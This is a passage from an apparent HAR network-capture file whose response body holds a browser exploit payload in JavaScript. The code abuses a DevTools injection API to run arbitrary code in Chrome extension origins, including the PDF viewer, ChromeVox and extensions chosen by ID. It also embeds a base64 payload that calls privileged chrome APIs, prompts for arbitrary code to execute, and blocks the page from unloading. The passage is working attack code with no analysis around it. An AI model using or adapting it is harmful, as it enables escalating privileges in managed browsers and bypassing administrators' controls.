document.querySelector('#activate').onclick = function () {\n              dbgext(false, pdfId);\n          }\n          onunload = function () {\n              while (true);\n          }\n          document.close();\n          document.title = \"Dashboard\";\n          document.querySelector('#activate2').onclick = function (ev) {\n\n              function xd(w) {\n                  w.close();\n                  const pdfId = \"mhjfbmdgcfjbbpaeojofohoefgiehjai\"; // Redefinition because we convert this function to a string\n                  const mojoURL = \"chrome://resources/mojo/mojo/public/js/bindings.js\";\n                  chrome.tabs.getCurrent(function (tab) {\n                      console.log(tab);\n                      chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {\n                          async function createAndWriteFile() {\n                              function writeFile(filename, content) {\n                                  return new Promise((resolve) => {\n                                      webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {\n                                          fs.root.getFile(filename, { create: true }, function (entry) {\n                                              entry.remove(function () {\n                                                  fs.root.getFile(filename, { create: true }, function (entry) {\n                                                      entry.createWriter(function (writer) {\n                                                          writer.write(new Blob([content]))\n                                                          writer.onwriteend = function () {\n                                                              resolve(entry.toURL());\n                                                          }\n                                                      })\n                                                  })\n                                              })\n                                          })\n                                      })\n                                  })\n\n                              }\n                              const htmlFile = `<html>\n                              <head></head><body><iframe src=\"filesystem:chrome://extensions/temporary/nothing.html\"></iframe>\n                              </html>\n                              <script>\n                              onerror=  alert;\n                              if (top !== window) {\n                                  top.location.replace(location.href);\n                              };\n                              </script>\n                              `\n                              opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');\n                              setTimeout(function () {\n                                  close();\n                              }, 800);\n                          }\n                          chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });\n                          function m2(url) {\n                              onmessage = function (data) {\n                                  if (data.data.type === \"ack\") {\n                                      \n                                          top.location.replace(\"\")\n                                  }\n                              }\n                              top.postMessage({ type: 'acc' }, '*');\n                          }\n                          onmessage = function (dat) {\n                              if (dat.data.url) {\n                                  m2(dat.data.url);\n                              }\n                          };\n                      })\n                  })\n\n              }\n              dbgext(false, pdfId, xd.toString());\n          }\n          onmessage = function (ev) {\n              if (ev.data.type === \"browserInitNavigate\") {\n                  alert(1);\n                  ev.source.location.replace(ev.data.url);\n              }\n          }\n          document.querySelector('#updater').onclick = function (ev) {\n              onunload = null;\n              const ws = new WebSocket(\"ws://%%updaterurl%%\");\n\n              ws.onopen = function () {\n                  ws.onmessage = function (ev) {\n                      const received = JSON.parse(ev.data);\n                      const savedURL = received.params.request.url;\n                      ws.close();\n                      const w = open('', '_blank');\n                      console.log(savedURL);\n                      w.eval(`setTimeout(function () {opener.open(atob(\"${btoa(savedURL)}\"), '_blank'); window.close()}, 500);`);\n                      setTimeout(() => { location.reload() });\n                  }\n                  ws.send(JSON.stringify({\n                      method: \"Target.setDiscoverTargets\",\n                      id: 999,\n                      params: {}\n                  }));\n              }\n\n          }\n          onmessage = function (d) {\n              if (d.data.type === \"acc\") {\n                  onunload = function () { while (true); };\n                  d.source.postMessage({ type: \"ack\" }, '*');\n                  \n              };\n\n              if (!globalMap[d.data.uid]) return;\n\n              for (const frame of globalMap) {\n                  if (!frame) continue;\n                  if (frame.idx === d.data.uid) {\n                      frame.remove();\n                      delete globalMap[globalMap.indexOf(frame)];\n                      return;\n                  }\n              }\n          }\n          function dbgext(cleanup, id, payload) {\n              let x = id;\n              while (!x) {\n                  x = prompt('Extension id?');\n                  if (x === \"cancel\") {\n                      return;\n                  }\n              }\n              let path = '//manifest.json';\n              let is_pdf = false;\n              let injected = payload ?? payload_swamp.toString();\n              if (x === pdfId) {\n                  path = \"index.html\"; // pdf viewer hack\n                  is_pdf = true;\n                  const b = prompt(\"code to execute!\");\n                  if (!b) return;\n                  injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));\n                  InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');\n                  \n              }\n              const URL_1 = `chrome-extension://${x ??\n                  alert(\"NOTREACHED\")}/${path}`;\n              InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: \"remove\", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);\n              const ifr = document.createElement(\"iframe\");\n              ifr.src = URL_1;\n              document.body.appendChild(ifr);\n              const ifrid = globalMap.push(ifr) - 1;\n              ifr.idx = ifrid;\n              ifr.onload = function () {\n\n                  ifr.contentWindow.postMessage({\n                      type: \"uidpass\", passcode:\n                          ifrid,\n                      cleanup: cleanup\n                  }, '*');\n              }\n\n          }\n          document.querySelector('#chromevox_hijack').onclick = function () {\n              const ifr = document.createElement(\"iframe\");\n              URL_EXPR=\"chrome-extension://mndnfokpggljbaajbnioimlmbfngpief/chromevox/log_page/log.html\"\n              ifr.src = URL_EXPR;\n              document.body.appendChild(ifr);\n              InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_EXPR).origin, atob('KGFzeW5jICgpID0+IHsKICBjb25zdCBmcyA9IGF3YWl0IG5ldyBQcm9taXNlKGZ1bmN0aW9uIChyZXNvbHZlKSB7CiAgICB3ZWJraXRSZXF1ZXN0RmlsZVN5c3RlbShQRVJTSVNURU5ULCAyICogMTAyNCAqIDEwMjQsIHJlc29sdmUpOwogIH0pOwoKICBmdW5jdGlvbiB3cml0ZUZpbGUoZmlsZSwgZGF0YSkgewogICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsKICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsgY3JlYXRlOiB0cnVlIH0sIGZ1bmN0aW9uIChlbnRyeSkgewogICAgICAgIGVudHJ5LnJlbW92ZSgKICAgICAgICAgIGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsgY3JlYXRlOiB0cnVlIH0sIGZ1bmN0aW9uIChlbnRyeSkgewogICAgICAgICAgICAgIGVudHJ5LmNyZWF0ZVdyaXRlcihmdW5jdGlvbiAod3JpdGVyKSB7CiAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgICAgICB3cml0ZXIub253cml0ZWVuZCA9ICgpID0+IHJlc29sdmUoZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgfSwKICAgICAgICAgIGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsgY3JlYXRlOiB0cnVlIH0sIGZ1bmN0aW9uIChlbnRyeSkgewogICAgICAgICAgICAgIGVudHJ5LmNyZWF0ZVdyaXRlcihmdW5jdGlvbiAod3JpdGVyKSB7CiAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgICAgICB3cml0ZXIub253cml0ZWVuZCA9ICgpID0+IHJlc29sdmUoZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgfQogICAgICAgICk7CiAgICAgIH0pOwogICAgfSk7CiAgfQoKICBjb25zdCBodG1sVXJsID0gYXdhaXQgd3JpdGVGaWxlKCJjaHJvbWV2b3guaHRtbCIsIGF0b2IoJ1BITmpjbWx3ZENCemNtTTlJaTR2ZG05NExtcHpJajQ4TDNOamNtbHdkRDQ9JykpOwoKICBhd2FpdCB3cml0ZUZpbGUoInZveC5qcyIsIGF0b2IoJ2IyNWxjbkp2Y2lBOUlHRnNaWEowT3dvS1kyOXVjM1FnZG05NFZHVnRjR3hoZEdVZ1BTQmdDanhrYVhZZ2FXUTlJblp2ZUY5amIyUmxYM0oxYm01bGNpSStDaUFnUEdneFBtVjJZV3dnWVhNZ1EyaHliMjFsVm05NFBDOW9NVDRLSUNBOGFESStWR2hwY3lCcGN5QnFkWE4wSUdFZ2NISnZiMllnYjJZZ1kyOXVZMlZ3ZEN3Z1ltVnNiM2NnWVhKbElHTm9jbTl0WlhadmVHVnpJSEJsY20xcGMzTnBiMjV6UEM5b01qNEtJQ0E4Y0Q1UVpYSnRhWE56YVc5dWN6b2dKSHRqYUhKdmJXVXVjblZ1ZEdsdFpTNW5aWFJOWVc1cFptVnpkQ2dwTG5CbGNtMXBjM05wYjI1ekxtcHZhVzRvSnl3Z0p5bDlQQzl3UGdvZ0lEeHdQa1Y0ZEdWdWMybHZiaUJKUkRvZ0pIdGphSEp2YldVdWNuVnVkR2x0WlM1cFpIMDhMM0ErUEdoeVBnb2dJRHgwWlhoMFlYSmxZU0JwWkQwaVkyOWtaVjlwYm5CMWRDSWdjM1I1YkdVOUluZHBaSFJvT2lBM01DVTdJR2hsYVdkb2REb2dNVFV3Y0hnN0lISmxjMmw2WlRvZ1ltOTBhRHNpUGp3dmRHVjRkR0Z5WldFK0NpQWdQR0oxZEhSdmJpQnBaRDBpWTI5a1pWOXlkVzRpUGxKMWJqd3ZZblYwZEc5dVBqeG9jajRLSUNBOFluVjBkRzl1SUdsa1BTSnphRzkzWDJabFpXUmlZV05ySWo1VGFHOTNJRVpsWldSaVlXTnJQQzlpZFhSMGIyNCtQR0p5UGdvZ0lEeGlkWFIwYjI0Z2FXUTlJbVoxYm01NVgySjFkSFJ2Ymw5d2JITmZZMnhwWTJzaVBsbHZkU0J6YUc5MWJHUWdkRzkwWVd4c2VTQmpiR2xqYXlCMGFHbHpJRzV2ZEdocGJtY2dkMmxzYkNCb1lYQndaVzRnZEhKMWMzUWdiV1U4TDJKMWRIUnZiajQ4WW5JK0NpQWdQR0oxZEhSdmJpQnBaRDBpWjJWMFgySmhkSFJsY25raVBrZGxkQ0JDWVhSMFpYSjVJSE4wWVhSMWN6d3ZZblYwZEc5dVBqeGljajRLSUNBOGRHVjRkR0Z5WldFZ2FXUTlJblJoWWw5dmNHVnVYM1Z5YkNJK1BDOTBaWGgwWVhKbFlUNDhZblYwZEc5dUlHbGtQU0owWVdKZmIzQmxibVZ5SWo1UGNHVnVJRlZTVENCcGJpQnVaWGNnZEdGaVBDOWlkWFIwYjI0K1BHSnlQZ284TDJScGRqNEtZRHNLQ21Oc1lYTnpJRlp2ZUNCN0NpQWdjM1JoZEdsaklHZGxkRVpUS0NrZ2V3b2dJQ0FnY21WMGRYSnVJRzVsZHlCUWNtOXRhWE5sS0hKbGMyOXNkbVVnUFQ0Z2V3b2dJQ0FnSUNCM1pXSnJhWFJTWlhGMVpYTjBSbWxzWlZONWMzUmxiU2hVUlUxUVQxSkJVbGtzSURJZ0tpQXhNREkwSUNvZ01UQXlOQ3dnY21WemIyeDJaU2s3Q2lBZ0lDQjlLVHNLSUNCOUNnb2dJSE4wWVhScFl5QmhjM2x1WXlCM2NtbDBaVVpwYkdVb1puTXNJR1pwYkdWdVlXMWxMQ0JrWVhSaEtTQjdDaUFnSUNCeVpYUjFjbTRnYm1WM0lGQnliMjFwYzJVb0tISmxjMjlzZG1Vc0lISmxhbVZqZENrZ1BUNGdld29nSUNBZ0lDQm1jeTV5YjI5MExtZGxkRVpwYkdVb1ptbHNaVzVoYldVc0lIc2dZM0psWVhSbE9pQjBjblZsSUgwc0lHVnVkSEo1SUQwK0lIc0tJQ0FnSUNBZ0lDQmxiblJ5ZVM1eVpXMXZkbVVvS0NrZ1BUNGdld29nSUNBZ0lDQWdJQ0FnWm5NdWNtOXZkQzVuWlhSR2FXeGxLR1pwYkdWdVlXMWxMQ0I3SUdOeVpXRjBaVG9nZEhKMVpTQjlMQ0JsYm5SeWVUSWdQVDRnZXdvZ0lDQWdJQ0FnSUNBZ0lDQmxiblJ5ZVRJdVkzSmxZWFJsVjNKcGRHVnlLSGR5YVhSbGNpQTlQaUI3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdkM0pwZEdWeUxtOXVkM0pwZEdWbGJtUWdQU0FvS1NBOVBpQnlaWE52YkhabEtHVnVkSEo1TWk1MGIxVlNUQ2dwS1RzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0IzY21sMFpYSXViMjVsY25KdmNpQTlJSEpsYW1WamREc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNCM2NtbDBaWEl1ZDNKcGRHVW9ibVYzSUVKc2IySW9XMlJoZEdGZEtTazdDaUFnSUNBZ0lDQWdJQ0FnSUgwcE93b2dJQ0FnSUNBZ0lDQWdmU2s3Q2lBZ0lDQWdJQ0FnZlNrN0NpQWdJQ0FnSUgwcE93b2dJQ0FnZlNrN0NpQWdmUW9LSUNCemRHRjBhV01nWVhONWJtTWdjblZ1UTI5a1pTaGpiMlJsS1NCN0NpQWdJQ0JqYjI1emRDQm1jeUE5SUdGM1lXbDBJRlp2ZUM1blpYUkdVeWdwT3dvZ0lDQWdZMjl1YzNRZ2RYSnNJRDBnWVhkaGFYUWdWbTk0TG5keWFYUmxSbWxzWlNobWN5d2dJbk55WXk1cWN5SXNJR052WkdVcE93b0tJQ0FnSUM4dklGSmxiVzkyWlNCbGVHbHpkR2x1WnlCelkzSnBjSFFnYVdZZ1lXNTVDaUFnSUNCamIyNXpkQ0J2YkdSVFkzSnBjSFFnUFNCa2IyTjFiV1Z1ZEM1blpYUkZiR1Z0Wlc1MFFubEpaQ2dpWlhaaGJIVmhkR1ZmWld4bGJTSXBPd29nSUNBZ2FXWWdLRzlzWkZOamNtbHdkQ2tnYjJ4a1UyTnlhWEIwTG5KbGJXOTJaU2dwT3dvS0lDQWdJQzh2SUVGd2NHVnVaQ0J1WlhjZ2MyTnlhWEIwSUhkcGRHZ2djM0pqSUhObGRDQjBieUJtYVd4bElGVlNUQW9nSUNBZ1kyOXVjM1FnYzJOeWFYQjBJRDBnWkc5amRXMWxiblF1WTNKbFlYUmxSV3hsYldWdWRDZ2ljMk55YVhCMElpazdDaUFnSUNCelkzSnBjSFF1YVdRZ1BTQWlaWFpoYkhWaGRHVmZaV3hsYlNJN0NpQWdJQ0J6WTNKcGNIUXVjM0pqSUQwZ2RYSnNPd29nSUNBZ1pHOWpkVzFsYm5RdVltOWtlUzVoY0hCbGJtUkRhR2xzWkNoelkzSnBjSFFwT3dvZ0lIMEtDaUFnYzNSaGRHbGpJR0ZqZEdsMllYUmxLQ2tnZXdvZ0lDQWdaRzlqZFcxbGJuUXVkM0pwZEdVb2RtOTRWR1Z0Y0d4aGRHVXBPd29nSUNBZ1pHOWpkVzFsYm5RdVkyeHZjMlVvS1RzS0NpQWdJQ0JrYjJOMWJXVnVkQzVuWlhSRmJHVnRaVzUwUW5sSlpDZ2lZMjlrWlY5eWRXNGlLUzVoWkdSRmRtVnVkRXhwYzNSbGJtVnlLQ0pqYkdsamF5SXNJR0Z6ZVc1aklDZ3BJRDArSUhzS0lDQWdJQ0FnWTI5dWMzUWdZMjlrWlNBOUlHUnZZM1Z0Wlc1MExtZGxkRVZzWlcxbGJuUkNlVWxrS0NKamIyUmxYMmx1Y0hWMElpa3VkbUZzZFdVN0NpQWdJQ0FnSUdGM1lXbDBJRlp2ZUM1eWRXNURiMlJsS0dOdlpHVXBPd29nSUNBZ2ZTazdDaUFnSUNCa2IyTjFiV1Z1ZEM1blpYUkZiR1Z0Wlc1MFFubEpaQ2dpYzJodmQxOW1aV1ZrWW1GamF5SXBMbUZrWkVWMlpXNTBUR2x6ZEdWdVpYSW9JbU5zYVdOcklpd2dZWE41Ym1NZ0tDa2dQVDRnZXdvZ0lDQWdJQ0JoZDJGcGRDQldiM2d1Y25WdVEyOWtaU2hnWTJoeWIyMWxMbVpsWldSaVlXTnJVSEpwZG1GMFpTNXZjR1Z1Um1WbFpHSmhZMnNvSjNGMWFXTnJiMlptYVdObEp5azdZQ2s3Q2lBZ0lDQjlLVHNLSUNBZ0lHUnZZM1Z0Wlc1MExtZGxkRVZzWlcxbGJuUkNlVWxrS0NKbWRXNXVlVjlpZFhSMGIyNWZjR3h6WDJOc2FXTnJJaWt1WVdSa1JYWmxiblJNYVhOMFpXNWxjaWdpWTJ4cFkyc2lMQ0JoYzNsdVl5QW9LU0E5UGlCN0NpQWdJQ0FnSUdGM1lXbDBJRlp2ZUM1eWRXNURiMlJsS0dCamFISnZiV1V1WVdOalpYTnphV0pwYkdsMGVWQnlhWFpoZEdVdVpHRnlhMlZ1VTJOeVpXVnVLSFJ5ZFdVcE8yQXBPd29nSUNBZ2ZTazdDaUFnSUNCa2IyTjFiV1Z1ZEM1blpYUkZiR1Z0Wlc1MFFubEpaQ2dpWjJWMFgySmhkSFJsY25raUtTNWhaR1JGZG1WdWRFeHBjM1JsYm1WeUtDSmpiR2xqYXlJc0lHRnplVzVqSUNncElEMCtJSHNLSUNBZ0lDQWdZWGRoYVhRZ1ZtOTRMbkoxYmtOdlpHVW9ZR05vY205dFpTNWhZMk5sYzNOcFltbHNhWFI1VUhKcGRtRjBaUzVuWlhSQ1lYUjBaWEo1UkdWelkzSnBjSFJwYjI0b1lXeGxjblFwTzJBcE93b2dJQ0FnZlNrN0NpQWdJQ0JrYjJOMWJXVnVkQzVuWlhSRmJHVnRaVzUwUW5sSlpDZ2lkR0ZpWDI5d1pXNWxjaUlwTG1Ga1pFVjJaVzUwVEdsemRHVnVaWElvSW1Oc2FXTnJJaXdnWVhONWJtTWdLQ2tnUFQ0Z2V3b2dJQ0FnSUNCamIyNXpkQ0IwWVdKdmNHVnVkWEpzSUQwZ1pHOWpkVzFsYm5RdVoyVjBSV3hsYldWdWRFSjVTV1FvSW5SaFlsOXZjR1Z1WDNWeWJDSXBMblpoYkhWbE93b2dJQ0FnSUNCaGQyRnBkQ0JXYjNndWNuVnVRMjlrWlNoZ1kyaHliMjFsTG5SaFluTXVZM0psWVhSbEtIdDlMQ0FvS1NBOVBpQjdJR05vY205dFpTNTBZV0p6TG5Wd1pHRjBaU2g3ZFhKc09pQWlZQ3QwWVdKdmNHVnVkWEpzSzJBaWZTazdJR05vY205dFpTNTBZV0p6TG5KbGJHOWhaQ2dwT3lCOUtUdGdLVHNLSUNBZ0lIMHBPd29nSUgwS2ZRcDNhVzVrYjNjdWIyNXNiMkZrSUQwZ0tDa2dQVDRnZXdvZ0lGWnZlQzVoWTNScGRtRjBaU2dwT3dwOU93bz0nKSk7CgogIGFsZXJ0KGh0bWxVcmwpOwp9KSgpOwo=')); // <- Base64 encoding of chromevox-entry.js\n          }\n          document.querySelector('#extdbg').onclick = function () {\n              dbgext(false);\n          }\n          document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {\n              let extid = el.getAttribute(\"ext\");\n              console.log(el.innerText, extid);\n              dbgext(false, extid);\n              }\n          });\n          document.querySelector('#cleanup').onclick = function () {\n              dbgext(true);\n          }\n          document.querySelector('#devdbg').onclick = function () {\n              var l_canceled = false;\n              const id = setTimeout(function m() {\n                  if (l_canceled) return;\n                  (new Function(prompt(\"Evaluate script! (type 'cancel' to cancel)\")))();\n                  if (!l_canceled) setTimeout(m, 0);\n                  clearTimeout(id);\n              });\n              Object.defineProperty(window, 'cancel', {\n                  get: function () {\n                      l_canceled = true;\n                  }, configurable: true\n              })\n              return;\n          }\n          console.log(globalMap);\n      }\n      w.eval(`(${ui.toString()})()`);\n      window.close();\n\n  }\n\n  function sleep(ms) {\n      return new Promise(resolve => {\n          setTimeout(resolve, ms);\n      });\n  }\n})\n)()\n"
          },
          "redirectURL": "",
          "headersSize": -1,
          "bodySize": -1
        },
        "serverIPAddress": "0.0.0.0",
        "startedDateTime": "2025-05-20T18:37:08.974Z",
        "time": 100,
        "timings": {
          "blocked": 0,
          "dns": 0,
          "ssl": 0,
          "connect": 0,
          "send": 0,
          "wait": 50,
          "receive": 50,
          "_blocked_queueing": 0
        }
      }
    ]
  }
}